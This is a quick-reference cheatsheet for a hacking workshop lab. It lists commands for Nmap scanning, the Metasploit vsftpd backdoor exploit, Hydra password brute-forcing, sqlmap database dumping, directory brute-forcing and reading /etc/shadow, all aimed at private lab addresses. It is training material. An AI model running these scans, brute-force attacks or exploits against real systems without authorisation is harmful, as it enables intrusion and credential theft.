# 📋 HackCraft Command Cheatsheet

Quick reference for all tools used in the workshop. Keep this open while working through the labs!

---

## 🔍 Nmap — Network Scanner

```bash
# Host discovery (ping sweep)
nmap -sn 10.10.10.0/24

# Basic port scan (top 1000 ports)
nmap 10.10.10.30

# Service version detection
nmap -sV 10.10.10.30

# Aggressive scan (versions + scripts + OS detection)
nmap -A 10.10.10.30

# Vulnerability scan
nmap --script vuln 10.10.10.30

# Web directory enumeration
nmap --script http-enum 10.10.10.20

# Save output to file
nmap -oN results.txt 10.10.10.30

# Scan specific ports
nmap -p 21,22,80,443 10.10.10.30

# Scan all 65535 ports
nmap -p- 10.10.10.30
```

---

## 💣 Metasploit — Exploitation Framework

```bash
# Launch Metasploit
msfconsole

# Search for exploits
search vsftpd
search type:exploit platform:linux

# Select an exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# View required options
show options

# Set target IP
set RHOSTS 10.10.10.30

# Run the exploit
run

# Background a session
background
# or: Ctrl+Z

# List active sessions
sessions -l

# Interact with a session
sessions -i 1

# Go back to main menu
back
```

---

## 🔑 Hydra — Password Brute-Forcer

```bash
# SSH brute-force with wordlist
hydra -l ctfuser -P /usr/share/wordlists/custom/rockyou-mini.txt ssh://10.10.10.40

# HTTP login brute-force
hydra -l admin -P wordlist.txt 10.10.10.20 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Login failed"

# FTP brute-force
hydra -l admin -P wordlist.txt ftp://10.10.10.30

# Common flags:
# -l username    Single username
# -L users.txt   Username list
# -p password    Single password
# -P list.txt    Password list
# -t 4           Number of threads (parallel attempts)
# -vV            Verbose output
```

---

## 🌐 curl — HTTP Client

```bash
# GET request
curl http://10.10.10.40

# View response headers only
curl -I http://10.10.10.40

# Verbose (see all headers + body)
curl -v http://10.10.10.40

# POST request with data
curl -X POST http://10.10.10.40/login.php \
  -d "username=admin&password=test"

# Follow redirects
curl -L http://10.10.10.40

# Save output to file
curl -o page.html http://10.10.10.40
```

---

## 📂 dirb / gobuster — Directory Brute-Forcing

```bash
# dirb (simpler)
dirb http://10.10.10.40

# dirb with custom wordlist
dirb http://10.10.10.40 /usr/share/dirb/wordlists/common.txt

# gobuster (faster)
gobuster dir -u http://10.10.10.40 -w /usr/share/dirb/wordlists/common.txt
```

---

## 💉 sqlmap — SQL Injection Tool

```bash
# Test a URL parameter for SQLi
sqlmap -u "http://10.10.10.40/page.php?id=1"

# Test a POST form
sqlmap -u "http://10.10.10.40/login.php" \
  --data="username=admin&password=test"

# Dump the database
sqlmap -u "http://target/page.php?id=1" --dump

# Common flags:
# --dbs          List databases
# --tables       List tables
# --dump         Dump table data
# --batch        Auto-answer prompts (non-interactive)
```

---

## 🖥️ Linux Essentials

```bash
# Who am I?
whoami
id

# System info
uname -a
hostname

# Network info
ifconfig
ip addr

# View files
cat /etc/passwd
cat /etc/shadow     # Needs root!
ls -la /home/

# Search for files
find / -name "flag*" 2>/dev/null
find / -name "*.txt" 2>/dev/null

# Search for text in files
grep -r "HACKCRAFT" / 2>/dev/null
grep -i "password" /etc/*.conf

# Ping a host
ping -c 3 10.10.10.20

# SSH to another machine
ssh ctfuser@10.10.10.40
```

---

## 🐳 Docker Commands

```bash
# Start the lab
docker compose up -d

# Check container status
docker compose ps

# Enter the Kali container
docker exec -it kali bash

# View container logs
docker compose logs ctf-server

# Stop the lab
docker compose down

# Full cleanup (remove all data)
docker compose down -v

# Rebuild a container
docker compose build --no-cache kali

# Restart a single service
docker compose restart dvwa
```

---

## 🔗 Useful Links

| Resource | URL |
|----------|-----|
| Nmap Docs | https://nmap.org/book/ |
| Metasploit Docs | https://docs.metasploit.com/ |
| DVWA Guide | https://github.com/digininja/DVWA |
| CVE Database | https://cve.mitre.org/ |
| CVSS Calculator | https://www.first.org/cvss/calculator/3.1 |
| TryHackMe | https://tryhackme.com |
| HackTheBox | https://hackthebox.com |
